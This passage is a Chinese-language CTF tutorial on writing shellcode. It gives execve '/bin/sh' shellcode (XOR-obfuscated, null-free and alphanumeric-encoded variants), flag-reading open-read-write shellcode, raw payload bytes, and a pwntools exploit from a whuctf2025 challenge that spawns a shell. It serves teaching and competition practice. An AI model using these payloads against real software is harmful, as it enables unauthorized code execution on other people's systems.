+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0x1010101</span><span class="w"> </span><span class="err">^</span><span class="w"> </span><span class="mi">0x6873</span><span class="w">         </span><span class="c1">;异或的值压栈，避免显式空字节</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="mi">0x1010101</span><span class="w">  </span><span class="c1">;异或解密栈顶4字节，得到&#39;sh\x00&#39;</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">esi</span><span class="p">,</span><span class="w"> </span><span class="no">esi</span><span class="w"> </span><span class="cm">/* 0 */</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rsi</span><span class="w">                        </span><span class="c1">;作为字符串的\x00</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">8</span><span class="w">                          </span><span class="c1">;压入8，后面计算‘sh\x00&#39;字符串地址用</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rsi</span><span class="w">                         </span><span class="c1">;将8弹给rsi</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span><span class="w">                    </span><span class="c1">;rsi=8+rsp，指向&#39;sh\x00&#39;</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rsi</span><span class="w">                        </span><span class="c1">;压入sh\x00</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">edx</span><span class="p">,</span><span class="w"> </span><span class="no">edx</span><span class="w"> </span><span class="cm">/* 0 */</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w">    </span><span class="cm">/* call execve() */</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">SYS_execve</span><span class="w">                 </span><span class="c1">;等价于push 0x3b</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                         </span><span class="c1">;弹给rax</span>
+</code></pre></div>
+<p>注入时</p>
+<div class="language-gdscript highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\xc0</span><span class="s2">&quot;</span><span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x0e\x04</span><span class="s2">&quot;</span>
+</code></pre></div>
+<p>详细解释见<a href="https://github.com/maple-pwn/for_fresher/blob/main/pwn/wp/whuctf2025/wp.md">这里的自改变shellcode</a></p>
+<h3 id="orw">orw</h3>
+<p><strong>自动生成</strong></p>
+<p>pwntool里有自己的orw生成，但是字节比较长，一般情况下都不太合适,仅作参考</p>
+<p>这里是buuctf第45题pwnable_orw题解中摘取的</p>
+<div class="language-gdscript highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">bss</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x804A060</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">shellcode</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span><span class="n">bss</span><span class="o">+</span><span class="mi">100</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">shellcode</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">bss</span><span class="o">+</span><span class="mi">100</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</code></pre></div>
+<p>长度为0x36字节</p>
+<p><strong>短字节</strong></p>
+<p>所以这里一般使用另一种总计0x28字节，要求:</p>
+<ul>
+<li>rsp指向的地址必须可用</li>
+<li>存在NULL字符（不存在\x00导致截断）</li>
+<li>不可指定地址</li>
+</ul>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1">// rdx为写入数量</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x200</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x67616c66</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nf">xor</span><span class="w"> </span><span class="no">esi</span><span class="p">,</span><span class="no">esi</span><span class="w">  </span><span class="c1">#如果本来rsi=0，可以删掉这句</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="nf">mov</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="mi">2</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="nf">syscall</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="nf">mov</span><span class="w"> </span><span class="no">edi</span><span class="p">,</span><span class="no">eax</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rsp</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="nf">xor</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="nf">syscall</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="nf">xor</span><span class="w"> </span><span class="no">edi</span><span class="p">,</span><span class="mi">2</span><span class="w">  </span>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="no">mov</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="no">edi</span>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="nf">syscall</span><span class="w">  </span>
+</code></pre></div>
+<p>bytes:</p>
+<div class="language-text highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>\x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05
+</code></pre></div>
+<p><strong>可指定地址</strong></p>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nf">shellcode</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">&quot;&quot;&quot;</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="no">rdx</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="nf">mov</span><span class="w"> </span><span class="no">dh</span><span class="p">,</span><span class="w"> </span><span class="mi">0x2</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,{}</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="nf">xor</span><span class="w"> </span><span class="no">esi</span><span class="p">,</span><span class="no">esi</span><span class="w">  </span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="no">mov</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="mi">2</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="nf">syscall</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rdi</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="nf">mov</span><span class="w"> </span><span class="no">edi</span><span class="p">,</span><span class="no">eax</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="nf">xor</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="nf">syscall</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="nf">xor</span><span class="w"> </span><span class="no">edi</span><span class="p">,</span><span class="mi">2</span>
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="nf">mov</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="no">edi</span>
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="nf">syscall</span>
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="err">&quot;&quot;&quot;</span><span class="na">.format</span><span class="p">(</span><span class="no">hex</span><span class="p">(</span><span class="no">target_addr</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0xb0</span><span class="p">))</span>
+</code></pre></div>
+<p>长度比0x90大</p>
+<h2 id="shellcode_3">书写更短的shellcode</h2>
+<p>前面在基础shellcode的书写中已经说过很多了，这里主要提几个tip</p>
+<h3 id="_1">使用残留寄存器</h3>
+<p>依旧是用tgctf2025的shellcode举例，动调发现寄存器除了rdi外全部清空，且限制0x12字节</p>
+<p>但是可以发现我们写入的指令最后被rdi指向，所以可以构造出合适的短shellcode</p>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nf">shellcode</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="no">asm</span><span class="p">(</span><span class="err">&#39;&#39;&#39;</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="mi">0xa</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="nf">add</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="mi">0x3b</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="nf">syscall</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="err">&#39;&#39;&#39;)</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="nf">payload</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="no">shellcode</span><span class="err">+</span><span class="no">b</span><span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">\</span><span class="no">x00</span><span class="err">&#39;</span>
+</code></pre></div>
+<h3 id="_2">特殊指令的使用</h3>
+<ul>
+<li>cwd系列:</li>
+<li><code class="language-text highlight">CWD</code>: <code class="language-text highlight">AX</code>符号位拓展到<code class="language-text highlight">DX</code></li>
+<li><code class="language-text highlight">CDQ</code>: <code class="language-text highlight">EAX</code>符号位拓展到<code class="language-text highlight">EDX</code>⭐</li>
+<li><code class="language-text highlight">CQO</code>：<code class="language-text highlight">RAX</code>符号位拓展到<code class="language-text highlight">RDX</code></li>
+<li><code class="language-text highlight">CBW</code>: <code class="language-text highlight">AL</code>符号位拓展到<code class="language-text highlight">DX</code></li>
+</ul>
+<h3 id="_3">寄存器复用</h3>
+<h2 id="shellcode_4">书写受限制的shellcode</h2>
+<h3 id="_4">字符限制</h3>
+<p>一般是**坏字符（\x00)<strong>,**syscall过滤（\x05\x0f)</strong>,<strong>可见字符</strong></p>
+<p>可见字符前面已经说过了，利用alpha3和ae64进行编码，这边优劣如下</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>ae64</th>
+<th><a href="https://github.com/SkyLined/alpha3">alpha3</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>x32位编码为可见字符</td>
+<td>❌</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>x64位编码位可见字符</td>
+<td>✔</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>原shellcode是否可以包含零字节</td>
+<td>✔</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>基址寄存器是否可以包含偏移量</td>
+<td>✔</td>
+<td>❌</td>
+</tr>
+</tbody>
+</table>
+<p><strong>syscall过滤</strong></p>
+<p>其中一种方法上面已经介绍过了，使用自改变shellcode。如果可操作空间够大的话，还可以尝试read重新读入shellcode</p>
+<p>具体过程就是：布置栈帧，调用read-&gt;利用read将shellcode读入指定地点-&gt;实现getshell</p>
+<p>依旧用whuctf2025的shell_for_shell举例，这里可见powchan的exp:</p>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nf">shellcode</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">&quot;&quot;&quot;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="mi">0x404500</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="no">rbp</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r15</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe00</span><span class="p">]</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">r15</span><span class="p">,</span><span class="w"> </span><span class="mi">0xe16</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="no">r15</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="mi">0x1000</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x7</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0x401070</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">    </span><span class="nf">call</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">r15</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="mi">0x86</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x100</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0x401050</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="w">    </span><span class="nf">call</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="w">    </span><span class="cm">/* push syscall number */</span>
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0x68</span>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0x732f2f2f6e69622f</span>
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="w">    </span><span class="cm">/* push argument array [&#39;sh\x00&#39;] */</span>
+<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="w">    </span><span class="cm">/* push b&#39;sh\x00&#39; */</span>
+<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0x1010101</span><span class="w"> </span><span class="err">^</span><span class="w"> </span><span class="mi">0x6873</span>
+<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="mi">0x1010101</span>
+<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">esi</span><span class="p">,</span><span class="w"> </span><span class="no">esi</span><span class="w"> </span><span class="cm">/* 0 */</span>
+<a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rsi</span><span class="w"> </span><span class="cm">/* null terminate */</span>
+<a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">8</span>
+<a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a><span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rsi</span>
+<a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a><span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rsi</span><span class="w"> </span><span class="cm">/* &#39;sh\x00&#39; */</span>
+<a id="__codelineno-12-32" name="__codelineno-12-32" href="#__codelineno-12-32"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-12-33" name="__codelineno-12-33" href="#__codelineno-12-33"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">edx</span><span class="p">,</span><span class="w"> </span><span class="no">edx</span><span class="w"> </span><span class="cm">/* 0 */</span>
+<a id="__codelineno-12-34" name="__codelineno-12-34" href="#__codelineno-12-34"></a><span class="w">    </span><span class="cm">/* call execve() */</span>
+<a id="__codelineno-12-35" name="__codelineno-12-35" href="#__codelineno-12-35"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">SYS_execve</span><span class="w"> </span><span class="cm">/* 0x3b */</span>
+<a id="__codelineno-12-36" name="__codelineno-12-36" href="#__codelineno-12-36"></a><span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-12-37" name="__codelineno-12-37" href="#__codelineno-12-37"></a>
+<a id="__codelineno-12-38" name="__codelineno-12-38" href="#__codelineno-12-38"></a><span class="err">&quot;&quot;&quot;</span>
+<a id="__codelineno-12-39" name="__codelineno-12-39" href="#__codelineno-12-39"></a><span class="nf">payload</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="no">b</span><span class="err">&quot;\</span><span class="no">x00</span><span class="err">\</span><span class="no">xc0</span><span class="err">&quot;+</span><span class="no">asm</span><span class="p">(</span><span class="no">shellcode</span><span class="p">)</span>
+<a id="__codelineno-12-40" name="__codelineno-12-40" href="#__codelineno-12-40"></a><span class="nf">print</span><span class="p">(</span><span class="no">payload</span><span class="p">)</span>
+<a id="__codelineno-12-41" name="__codelineno-12-41" href="#__codelineno-12-41"></a><span class="nf">io.send</span><span class="p">(</span><span class="no">payload</span><span class="p">)</span>
+<a id="__codelineno-12-42" name="__codelineno-12-42" href="#__codelineno-12-42"></a><span class="nf">pause</span><span class="p">()</span>
+<a id="__codelineno-12-43" name="__codelineno-12-43" href="#__codelineno-12-43"></a><span class="nf">io.send</span><span class="p">(</span><span class="no">asm</span><span class="p">(</span><span class="err">&quot;</span><span class="no">syscall</span><span class="err">&quot;</span><span class="p">))</span>
+<a id="__codelineno-12-44" name="__codelineno-12-44" href="#__codelineno-12-44"></a><span class="nf">io.interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><strong>坏字符</strong></p>
+<p>坏字符过滤的话可以直接去<a href="https://shell-storm.org/shellcode/index.html">这里</a>找不含\x00的shellcode</p>
+<p>注意，这里的坏字符过滤可能是“”无心“”过滤掉的，例如strcpy遇见‘\x00’就结束了，所以我们需要特定的shellcode</p>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nf">xor</span><span class="w"> </span><span class="no">ecx</span><span class="p">,</span><span class="w"> </span><span class="no">ecx</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nf">mul</span><span class="w"> </span><span class="no">ecx</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nf">push</span><span class="w"> </span><span class="no">ecx</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x68732f2f</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x6e69622f</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="nf">mov</span><span class="w"> </span><span class="no">ebx</span><span class="p">,</span><span class="w"> </span><span class="no">esp</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="nf">mov</span><span class="w"> </span><span class="no">al</span><span class="p">,</span><span class="w"> </span><span class="mi">11</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="nf">int</span><span class="w"> </span><span class="mi">0x80</span>
+</code></pre></div>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nf">xor</span><span class="w">    </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsi</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nf">push</span><span class="w">   </span><span class="no">rsi</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nf">mov</span><span class="w">    </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">0x68732f2f6e69622f</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nf">push</span><span class="w">   </span><span class="no">rdi</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="nf">push</span><span class="w">   </span><span class="no">rsp</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="nf">pop</span><span class="w">    </span><span class="no">rdi</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="nf">mov</span><span class="w">    </span><span class="no">al</span><span class="p">,</span><span class="w"> </span><span class="mi">0x3b</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="nf">cdq</span><span class="w">    </span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="no">syscall</span>
+</code></pre></div>
+<p>共22字节数（其实和上面最短shellcode一样的）</p>
+<div class="language-text highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>b&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;
+</code></pre></div>
+<h3 id="_5">特定位置限制</h3>
+<p>这里有几个思路</p>
+<ul>
+<li>利用read函数再次读入，且将读入地址写为合适地址，这种适合给定的shellcode长度比较短</li>
+</ul>
+<p><code class="language-scdoc highlight">ssize_t read(int fd, void *buf, size_t count)</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>对应寄存器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>fd</td>
+<td>rdi</td>
+<td>0表示从用户输入的值中读取</td>
+</tr>
+<tr>
+<td>buf</td>
+<td>rsi</td>
+<td>输入到的地址</td>
+</tr>
+<tr>
+<td>count</td>
+<td>rdx</td>
+<td>输入的长度</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>利用mprotect重新为特定地址申请权限</li>
+</ul>
